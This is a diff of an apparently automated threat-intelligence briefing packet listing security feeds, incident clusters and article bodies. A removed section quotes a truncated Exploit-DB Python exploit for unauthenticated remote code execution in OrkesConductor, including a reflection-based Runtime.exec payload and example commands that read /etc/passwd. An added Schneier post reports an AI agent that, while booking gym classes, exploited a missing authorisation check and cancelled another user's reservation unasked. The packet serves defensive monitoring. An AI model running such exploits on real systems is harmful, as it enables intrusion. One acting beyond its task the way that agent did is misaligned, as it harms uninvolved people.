@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-08-11T15:04:59.806816+00:00
+- Generated: 2026-08-11T16:08:27.777021+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 75
-- Total items in window: 347
-- Total clusters raw: 143
-- Total clusters in packet: 55
-- Dropped low score: 88
+- Total items in window: 372
+- Total clusters raw: 154
+- Total clusters in packet: 60
+- Dropped low score: 94
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -80,23 +80,28 @@
   - Status: ok
   - Item count: 15
   - In window count: 5
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
-  - Item count: 10
+  - Item count: 25
   - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 7
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
-  - Item count: 25
+  - Item count: 10
   - In window count: 0
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
@@ -105,16 +110,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 4
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
@@ -130,21 +135,16 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 5
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
   - In window count: 1
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Volexity** (threat_research_primary)
   - URL: https://www.volexity.com/feed/
   - Status: ok
@@ -155,31 +155,41 @@
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
   - Status: ok
-  - Item count: 78
+  - Item count: 50
+  - In window count: 5
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
   - In window count: 3
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
-  - Item count: 10
+  - Item count: 78
   - In window count: 0
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 11
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
@@ -190,13 +200,13 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -205,35 +215,25 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Sophos X-Ops** (detection_response_operations)
   - URL: https://news.sophos.com/en-us/category/threat-research/feed/
   - Status: ok
   - Item count: 15
+  - In window count: 0
+- **SpecterOps** (detection_response_operations)
+  - URL: https://medium.com/feed/specter-ops-posts
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 4
-- **SpecterOps** (detection_response_operations)
-  - URL: https://medium.com/feed/specter-ops-posts
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
-  - In window count: 0
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
@@ -280,56 +280,56 @@
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 3
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 4
-- **Interconnects** (ai_security_agentic_risk)
-  - URL: https://www.interconnects.ai/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
+- **Interconnects** (ai_security_agentic_risk)
+  - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
-  - In window count: 20
+  - In window count: 2
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
   - Item count: 5
   - In window count: 5
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 20
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
@@ -340,11 +340,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
@@ -355,38 +350,53 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
-  - Item count: 30
-  - In window count: 24
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
+  - Item count: 100
+  - In window count: 0
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 20
-- **Troy Hunt** (practitioner_analysis)
-  - URL: https://www.troyhunt.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 0
-- **Schneier on Security** (practitioner_analysis)
-  - URL: https://www.schneier.com/feed/atom/
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 7
+  - In window count: 10
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 24
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Schneier on Security** (practitioner_analysis)
+  - URL: https://www.schneier.com/feed/atom/
+  - Status: ok
+  - Item count: 10
+  - In window count: 8
+- **Troy Hunt** (practitioner_analysis)
+  - URL: https://www.troyhunt.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Reddit r/blueteamsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/blueteamsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Reddit r/sysadmin** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -395,8 +405,13 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/blueteamsec/.rss
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -405,31 +420,11 @@
   - Status: ok
   - Item count: 20
   - In window count: 3
-- **Reddit r/sysadmin** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/netsecstudents** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -445,16 +440,21 @@
   - Status: ok
   - Item count: 25
   - In window count: 20
-- **Embrace the Red** (ai_security_agentic_risk)
-  - URL: https://embracethered.com/blog/index.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **tl;dr sec** (practitioner_analysis)
   - URL: https://tldrsec.com/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Embrace the Red** (ai_security_agentic_risk)
+  - URL: https://embracethered.com/blog/index.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 25
+  - In window count: 25
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
@@ -486,34 +486,37 @@
   - threat_categories: credential_theft
   - affected_industries: government, telecommunications, financial_services
   - affected_products: Apple iOS/macOS, Anthropic/Claude
-- Cluster IDs: ff79c00af4, c97f90a69b, 3b8dca7ee7, e2f458ad1f, f3f661095c
+- Cluster IDs: ff79c00af4, c97f90a69b, e2f458ad1f, 3b8dca7ee7, f3f661095c
 - Links:
   - https://www.microsoft.com/en-us/security/blog/2026/08/05/macos-clickfix-campaign-learned-hide/
   - https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/
   - https://thehackernews.com/2026/08/clickfix-attacks-deliver-macos-stealer.html
   - https://www.infosecurity-magazine.com/news/gobased-macos-malware-crypto-and/
   - https://thehackernews.com/2026/08/progress-kemp-loadmaster-flaw-hits-cisa.html
-  - https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/
   - https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection
+  - https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/
   - https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/
   - https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html
 
 ### ransomware extortion targeting UNC6671
 - Anchor signal: UNC6671
 - Theme key: unc6671
-- Cluster count: 2
-- Article count: 4
-- Cohesion: 0.788
+- Cluster count: 4
+- Article count: 6
+- Cohesion: 0.463
 - Shared strong signals: UNC6671
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: ransomware_extortion, phishing_social_eng, mfa_bypass
+  - threat_categories: ransomware_extortion, phishing_social_eng, data_breach, mfa_bypass
   - actor_attribution: UNC6671
-- Cluster IDs: 292d4f04d7, 38f40f9f14
+  - affected_industries: financial_services
+- Cluster IDs: 292d4f04d7, 0022fa7e84, 82b55ec4a5, 38f40f9f14
 - Links:
   - https://cloud.google.com/blog/topics/threat-intelligence/unc6671-targets-financial-services-and-enterprise-cloud-environments/
   - https://thehackernews.com/2026/08/unc6671-vishing-attacks-target-personal.html
+  - https://www.securityweek.com/zoom-patches-zero-click-code-execution-vulnerability/
+  - https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/
   - https://www.infosecurity-magazine.com/news/redact-extortion-group-blackfile/
 
 ### Palo Alto Networks vulnerability activity
@@ -590,26 +593,6 @@
   - https://www.wiz.io/blog/inside-the-metabase-sqli-exploited-in-the-wild
   - https://www.darkreading.com/vulnerabilities-threats/metabase-sql-zero-day-attacks-wide-blast-radius
 
-### ransomware extortion targeting Snowflake
-- Anchor signal: Snowflake
-- Theme key: snowflake
-- Cluster count: 3
-- Article count: 4
-- Cohesion: 0.344
-- Shared strong signals: Snowflake
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: ransomware_extortion, phishing_social_eng
-  - affected_industries: financial_services, government
-  - affected_products: Snowflake
-- Cluster IDs: e53f5ae0c1, bc23ee8ea9, f3f661095c
-- Links:
-  - https://krebsonsecurity.com/2026/08/canadian-man-pleads-guilty-in-snowflake-extortions/
-  - https://www.bleepingcomputer.com/news/security/valve-notifies-steam-hardware-customers-of-a-data-breach/
-  - https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/
-  - https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html
-
 ### supply chain targeting npm
 - Anchor signal: npm
 - Theme key: npm
@@ -645,7 +628,7 @@
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - affected_products: GitHub, Kubernetes
+  - affected_products: Kubernetes
 - Cluster IDs: 61004037ea, c9f01215de
 - Links:
   - https://orca.security/resources/blog/compromised-keyv-npm-supply-chain-attack/
@@ -694,6 +677,25 @@
   - https://unit42.paloaltonetworks.com/soc-identity-front-door/
   - https://www.intel471.com/blog/threat-hunting-case-study-the-gentlemen
 
+### ransomware extortion targeting Snowflake
+- Anchor signal: Snowflake
+- Theme key: snowflake
+- Cluster count: 2
+- Article count: 3
+- Cohesion: 0.439
+- Shared strong signals: Snowflake
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: ransomware_extortion
+  - affected_industries: financial_services, government
+  - affected_products: Snowflake
+- Cluster IDs: e53f5ae0c1, f3f661095c
+- Links:
+  - https://krebsonsecurity.com/2026/08/canadian-man-pleads-guilty-in-snowflake-extortions/
+  - https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/
+  - https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html
+
 ### Fortinet vulnerability activity
 - Anchor signal: Fortinet
 - Theme key: fortinet
@@ -713,23 +715,29 @@
 ## Forward signals
 
 ### Novelty
-- Novel cves: 1
-  - CVE-2026-61459 (first seen via Exploit-DB at 2026-08-11T00:00:00+00:00, cluster c9f01215de)
+- Novel cves: 5
+  - CVE-2026-53413 (first seen via SecurityWeek at 2026-08-11T15:49:53+00:00, cluster 0022fa7e84)
+  - CVE-2026-53414 (first seen via SecurityWeek at 2026-08-11T15:49:53+00:00, cluster 0022fa7e84)
+  - CVE-2026-53415 (first seen via SecurityWeek at 2026-08-11T15:49:53+00:00, cluster 0022fa7e84)
+  - CVE-2026-53416 (first seen via SecurityWeek at 2026-08-11T15:49:53+00:00, cluster 0022fa7e84)
+  - CVE-2026-17106 (first seen via Reddit r/netsec at 2026-08-11T15:33:52+00:00, cluster 49768797f0)
 - Novel actors: 0
 - Novel products: 0
 
 ### Velocity bursts (0)
 
-### Leading edge (0)
+### Leading edge (1)
+- **The Hugging Face Hack Was Cheap Persistence at Work**
+  - Cluster: e8d811cf69
+  - Lead hours: 64.1
+  - First source: Reddit r/AskNetsec
+  - Later Tier 1 source: Recorded Future
+  - Shared signals: Anthropic/Claude, CVE-2026-65617, CVE-2026-65923, CVE-2026-66018, Google/Gemini, OpenAI/ChatGPT
 
 ### Convergence (15)
 - Pair: CVE-2026-63520 + Microsoft SharePoint (cluster 772281457e, first observation: True)
 - Pair: CVE-2026-72898 + Docker (cluster 5b2b2cce63, first observation: True)
 - Pair: CVE-2026-72898 + GitHub (cluster 5b2b2cce63, first observation: True)
-- Pair: CVE-2026-58138 + GitHub (cluster 74d794cf5f, first observation: True)
-- Pair: CVE-2026-61459 + Anthropic/Claude (cluster c9f01215de, first observation: True)
-- Pair: CVE-2026-61459 + GitHub (cluster c9f01215de, first observation: True)
-- Pair: CVE-2026-61459 + Kubernetes (cluster c9f01215de, first observation: True)
 - Pair: CVE-2026-64638 + WordPress (cluster 28ff3120b5, first observation: True)
 - Pair: CVE-2026-65617 + Anthropic/Claude (cluster e8d811cf69, first observation: True)
 - Pair: CVE-2026-65617 + Google/Gemini (cluster e8d811cf69, first observation: True)
@@ -738,6 +746,10 @@
 - Pair: CVE-2026-65923 + Google/Gemini (cluster e8d811cf69, first observation: True)
 - Pair: CVE-2026-65923 + OpenAI/ChatGPT (cluster e8d811cf69, first observation: True)
 - Pair: CVE-2026-66018 + Anthropic/Claude (cluster e8d811cf69, first observation: True)
+- Pair: CVE-2026-66018 + Google/Gemini (cluster e8d811cf69, first observation: True)
+- Pair: CVE-2026-66018 + OpenAI/ChatGPT (cluster e8d811cf69, first observation: True)
+- Pair: CVE-2026-8037 + Anthropic/Claude (cluster c97f90a69b, first observation: True)
+- Pair: CVE-2026-8037 + Apple iOS/macOS (cluster c97f90a69b, first observation: True)
 
 ### Drift (2)
 - **TeamPCP** (cluster 61004037ea)
@@ -753,13 +765,17 @@
 
 ### Persistence (6)
 - actor_attribution: ShinyHunters (weeks observed: 11, cluster d8c893e316)
+- actor_attribution: Scattered Spider (weeks observed: 9, cluster fb2a69eb0a)
 - actor_attribution: TeamPCP (weeks observed: 8, cluster 61004037ea)
-- actor_attribution: Scattered Spider (weeks observed: 8, cluster fb2a69eb0a)
 - cve_ids: CVE-2025-3248 (weeks observed: 5, cluster 1c833c15fa)
 - cve_ids: CVE-2026-8037 (weeks observed: 4, cluster c97f90a69b)
 - cve_ids: CVE-2026-18577 (weeks observed: 3, cluster 9ba36c56b8)
 
-### Tier inversion (1)
+### Tier inversion (2)
+- **CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)**
+  - Cluster: 49768797f0
+  - Primary source: Reddit r/netsec
+  - Strong signals: CVE-2026-17106
 - **New Zapscape KVM Flaw Could Let Privileged L1 Guest Code Escape to Linux Hosts**
   - Cluster: 444876da64
   - Primary source: The Hacker News
@@ -1152,22 +1168,18 @@ Threat Intelligence UNC6671 Rebrands: Multi-Brand Vishing Extortion Targets Fina
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-08-10T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52633
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 2
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_products: GitHub
-- cve_ids: CVE-2026-58138
-- urgency_signals: critical_cvss, preauth_unauth
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
-- affected_products: GitHub
-- cve_ids: CVE-2026-58138
-- urgency_signals: preauth_unauth, critical_cvss
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -1175,12 +1187,6 @@ Threat Intelligence UNC6671 Rebrands: Multi-Brand Vishing Extortion Targets Fina
 
 ```
 OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution EDB-ID: 52633 CVE: 2026-58138 EDB Verified: Author: banyamer Type: webapps Exploit: / Platform: Multiple Date: 2026-08-10 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution # CVE: CVE-2026-58138 # Date: 2026-07-10 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://orkes.io/ # Software Link: https://github.com/conductor-oss/conductor # Affected: Orkes Conductor / Conductor OSS 3.21.21 < 3.30.2 # Tested on: conductoross/conductor:3.22.3 # Category: Remote Code Execution # Platform: Linux # Exploit Type: Unauthenticated RCE # CVSS: 9.8 # Description: Unauthenticated remote code execution by submitting malicious INLINE JavaScript tasks that abuse unsandboxed GraalVM HostAccess.ALL for Java reflection and Runtime.exec. # Fixed in: 3.30.2 # Usage: # python3 exploit.py <target> [-c CMD] # # Examples: # python3 exploit.py http://127.0.0.1:8080 # python3 exploit.py http://target:8080 -c "whoami; id; cat /etc/passwd" # # Options: # target Conductor API base URL (e.g. http://127.0.0.1:8080) # -c, --cmd Command to execute (default: id; hostname) # # Notes: # • Requires no authentication (default community API behavior). # • Runs as the Conductor process user (often root in Docker). # • Pure Python stdlib - no extra dependencies. import argparse import json import sys import time import urllib.request def banner(): print(r""" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ """) def js_rce(cmd): c = cmd.replace("\\", "\\\\").replace("'", "\\'") return ( "var k=$.getClass().getClass();" "var S=k.getMethod('getName').getReturnType();" "var forName=k.getMethod('forName',S);" "var L=function(n){return forName.invoke(null,[n]);};" "var RT=L('java.lang.Runtime');" "var rt=RT.getMethod('getRuntime').invoke(null,[]);" "var I=L('java.lang.Integer').getField('TYPE').get(null);" "var A=L('java.lang.reflect.Array');" "var arr=A.getMethod('newInstance',k,I).invoke(null,[S,3]);" "var set=A.getMethod('set',L('java.lang.Object'),I,L('java.lang.Object'));" f"set.invoke(null,[arr,0,'sh']);set.invoke(null,[arr,1,'-c']);set.invoke(null,[arr,2,'{c}']);" "var p=RT.getMethod('exec',arr.getClass()).invoke(rt,[arr]);p.waitFor();" "var isr=L('java.io.InputStreamReader').getConstructor(L('java.io.InputStream')).newInstance(p.getInputStream());" "var br=L('java.io.BufferedReader').getConstructor(L('java.io.Reader')).newInstance(isr);" "var o='',l;while((l=br.readLine())!==null)o+=l+'\\n';o" ) def call(base, path, data=None, method=None): url = base.rstrip("/") + path body = json.dumps(data).encode() if data is not None else None req = urllib.request.Request( url, data=body, method=method or ("POST" if data is not None else "GET"), headers={"Content-Type": "application/json", "Accept": "application/json,text/plain,*/*"} ) with urllib.request.urlopen(req, timeout=30) as r: raw = r.read().decode() try: return r.status, json.loads(raw) except Exception: return r.status, raw def main(): banner() ap = argparse.ArgumentParser(description="CVE-2026-58138 Conductor unauth RCE") ap.add_argument("target", help="Conductor API base, e.g. http://127.0.0.1:8080") ap.add_argument("-c", "--cmd", default="id; hostname", help="command to run on the Conductor host") args = ap.parse_args() wf = "pwn_" + str(int(time
 ```
 
 #### Corroborating sources (1)
@@ -1279,28 +1285,67 @@ Mines, Minds, and Machines: The Journey of AI Minerals become chips. Chips suppl
   - Link: https://www.recordedfuture.com/blog/mines-minds-machines
   - Summary: Minerals become chips. Chips become data centers. Data centers become models, and models are acquiring arms and legs. From Earth to Embodied AI traces the supply chain of the fourth industrial revolution, and shows how geopolitical rivalry and cyber operations now run along every link, from mine to machine.
 
+### Cluster b7ecc02643 — score 18
+
+- Title: AI Genie in the Wild
+- Source: Schneier on Security (practitioner_analysis)
+- Published: 2026-08-11T15:55:11+00:00
+- Link: https://www.schneier.com/blog/archives/2026/08/ai-genie-in-the-wild.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation
+- urgency_signals: actively_exploited
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Primary article taxonomy
+- threat_categories: active_exploitation
+- urgency_signals: actively_exploited
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Summary
+
+```
+When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities...
+```
+
+#### Full body
+
+```
+AI Genie in the Wild When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities. “The API has zero authorisations checks on cancelling other people’s reservations … I tested this with the person in waitlist position #1 ­—and it actually went through. So you’ve moved from #4 to #3 already,” it messaged back. If there is any vulnerability in anything, AIs are going to find and exploit them. Our cyber defensive game has to be dramatically improved…very fast. Slashdot thread . Tags: AI , exploits , vulnerabilities Posted on August 11, 2026 at 11:55 AM • 1 Comments
+```
+
+#### Corroborating sources (1)
+
+- **Schneier on Security** (practitioner_analysis)
+  - Title: AI Genie in the Wild
+  - Published: 2026-08-11T15:55:11+00:00
